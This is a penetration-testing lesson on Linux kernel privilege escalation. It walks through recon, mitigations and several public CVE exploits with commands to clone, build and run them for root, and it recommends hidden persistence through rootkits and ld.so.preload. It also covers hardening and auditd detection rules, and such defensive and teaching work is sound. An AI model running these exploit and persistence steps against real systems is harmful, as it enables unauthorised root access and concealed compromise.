# Linux Kernel Privilege Escalation

You popped a Linux box and got a low-priv shell. The kernel is your door to root. This lesson walks the recent kernel CVEs that actually work in 2024–2026, the primitives behind them, and how defenders can detect or prevent each.

> [!warning] Lab use only
> Kernel exploits crash systems. Run them on disposable VMs / lab targets. Production kernels often differ from CVE PoC build assumptions and may panic instead of escalate.

## Initial recon — what kernel are you on?

```terminal
uname -r                       # 6.5.0-15-generic etc.
uname -a
cat /etc/os-release
arch                           # x86_64, aarch64
cat /proc/cmdline              # kernel boot params
cat /proc/version

# Mitigations active
cat /proc/sys/kernel/randomize_va_space   # 2 = full ASLR
cat /proc/sys/kernel/kptr_restrict        # 0 = leak; 2 = hidden
cat /proc/sys/kernel/dmesg_restrict
mount | grep -E 'kernel|cgroup'
zgrep -E 'CONFIG_(BPF|USER_NS|UNPRIVILEGED|SLAB_FREELIST|RANDOM)' /proc/config.gz 2>/dev/null
```

```terminal
# Auto-enumerate
linpeas.sh -a | tee peas.out
linux-exploit-suggester.sh -k $(uname -r)
```

## Mitigations you must understand

| Mitigation | What it stops | Bypass class |
|-----------|---------------|--------------|
| KASLR | Hard-coded kernel addresses | Info leaks (dmesg, /proc, side-channel) |
| SMEP | Jump to userland code from kernel | ROP/JOP within kernel |
| SMAP | Read userland data from kernel | bypass via stack pivot or kasan-style leaks |
| KPTI (Meltdown) | Userland sees kernel mappings | n/a — only Spectre-class needs it |
| `kernel.unprivileged_userns_clone=0` | User-namespace LPE class | Pre-existing setuid escape paths |
| `kernel.unprivileged_bpf_disabled=1` | eBPF JIT bugs | Hardware/IO uring etc. |
| Lockdown integrity mode | Kernel module load, kexec, /dev/mem | Less paths, but UAFs still work |

## CVE-2022-0847 — DirtyPipe

Write to any file readable by the user — and **any file that backs a page** in cache, including SUID binaries → instant root.

```terminal
# Affects 5.8 ≤ kernel < 5.16.11 / 5.15.25 / 5.10.102
gcc dirtypipe.c -o dp
./dp /usr/bin/su 0 'YjzVFRxd'   # patches getpwnam() check
su  # → root
```

> [!tip] DirtyPipe primitive in one line
> A pipe buffer flag (`PIPE_BUF_FLAG_CAN_MERGE`) wasn't cleared after a `splice()` from a file → next write to the pipe is reflected into the *file's page cache*. No CAP_*, no namespaces, no fancy primitives — just a missing flag clear.

## CVE-2023-3269 — StackRot

Maple-tree → use-after-free in MM. Public exploit gives KASLR leak + WAW primitive → root. Affects 6.1 — 6.4.

```terminal
# Use Mempodipper-style helper for slab massage
git clone https://github.com/lrh2000/StackRot && cd StackRot
make && ./exploit
id
```

## CVE-2024-1086 — nftables UAF (universal-ish)

A use-after-free in `nf_tables` exploitable via crafted netlink. With `unprivileged_userns_clone=1` (default on most distros until late 2024), low-priv users could trigger.

```terminal
# Public PoC supports 5.14 → 6.6
cd CVE-2024-1086
./compile.sh && ./exploit
# /tmp/.r → setuid root shell
```

## CVE-2024-26926 / CVE-2024-26581 — io_uring & netfilter chains

io_uring has produced a steady stream of LPEs since 2022; the trade-off Linus warned about. If you see an old kernel where `/proc/sys/kernel/io_uring_disabled` ≠ 2, expect exploits. Disable in production unless you measure a real perf need.

## CVE-2023-0386 — OverlayFS uid mapping

A long-standing class. Mounting an overlay with attacker-controlled lower/upper crosses uid namespaces and yields a SUID root copy.

```terminal
# Affects 5.11 → 6.2
git clone https://github.com/sxlmnwb/CVE-2023-0386 && cd CVE-2023-0386
make && ./exp
./fuse
```

## CVE-2022-2588 — `cls_route` UAF

Older but still seen on RHEL/CentOS 7-8 where backports lag. Triggered via `tc filter`.

```terminal
# Requires CAP_NET_ADMIN inside a user namespace, often available
unshare -Urn
tc qdisc add dev lo root handle 1: htb
tc filter add dev lo parent 1: handle 800::1 protocol ip prio 10 route ...
# triggers UAF
```

## eBPF — recurring bug class

eBPF verifier bugs grant arbitrary kernel R/W. Every year a new one surfaces (CVE-2021-3490, 2022-23222, 2023-2163, 2024-26581-class). Hardening: `kernel.unprivileged_bpf_disabled=1`.

```terminal
# Test attack surface
sysctl kernel.unprivileged_bpf_disabled
# If 0, enumerate eBPF helper version table for known-vuln helpers.
```

## Container-context LPE

Even containers run the same kernel. `unshare -r` for a quick user-namespace test:

```terminal
# Inside container — same kernel as host
unshare -Urnm
# If allowed, you have CAP_* inside the new userns; many LPE PoCs need exactly this.
```

If the host kernel is vulnerable, escape from container = root on host, regardless of seccomp profile (kernel-level bug bypasses syscall filter when the bug is in the syscall implementation).

## Side-channel primitives that matter

- **kASLR leak via /proc/kallsyms** if `kptr_restrict=0` — gift.
- **dmesg leaking pointer values** — happens on debug kernels and many embedded.
- **side-channel timing** for KASLR (ENTRYBLEED, etc.) — niche but published.
- **MSR access via /dev/cpu/\*/msr** — only with CAP_SYS_RAWIO, but enables KASLR break instantly.

## Defense — five practical kernel hardenings

1. **`kernel.unprivileged_userns_clone=0`** — kills a huge class of LPE PoCs that rely on userns.
2. **`kernel.unprivileged_bpf_disabled=1`** — closes the eBPF verifier bug class.
3. **`kernel.io_uring_disabled=2`** — unless your workload needs it.
4. **`kernel.kptr_restrict=2` + `dmesg_restrict=1`** — fight info leaks.
5. **`/proc/sys/kernel/yama/ptrace_scope=2`** — limits lateral via ptrace.
6. **lockdown=integrity** when secure-boot is enabled.
7. **Stay current**: subscribe to your distro's USN/RHSA/DLA feed; auto-apply security kernels weekly.

## Detection ideas

| Telemetry | Signal |
|-----------|--------|
| auditd `execve` of `/tmp/.*` SUID after fresh setuid+0 | likely LPE |
| `unshare(CLONE_NEWUSER)` from a user shell | rare in prod, common in PoC |
| Kernel oops/panic messages | failed exploit attempt |
| New SUID file in `/tmp /var/tmp /dev/shm` | dropped exploit binary |
| sudden burst of `bpf()` syscalls from non-admin | eBPF probing |

```terminal
# Short auditd ruleset
auditctl -a always,exit -F arch=b64 -S unshare -k unshare
auditctl -a always,exit -F arch=b64 -S bpf -k bpf
auditctl -a always,exit -F arch=b64 -S setuid -F a0=0 -k root_setuid
```

## When you're rooted — what next

The post-exploitation lesson covers persistence; the kernel-specific moves are:

- Drop a kernel module / rootkit only when you must — it's noisy and inspectable.
- Prefer userland persistence (cron, systemd, ld.so.preload, SUID dropbear) — easier to remove cleanly post-engagement.
- For long-term, consider an eBPF-based rootkit (kovid, ebpfkit-style) — survives reboots if installed via systemd unit, very hard to spot without dedicated tooling.

> [!info] Most engagements never need a 0-day
> If your target runs `5.4.x` or `5.10.x` LTS without recent patches, a public PoC will work. Real-world data shows ~60% of breached Linux hosts have known LPEs available. Patch cadence beats novel exploits.
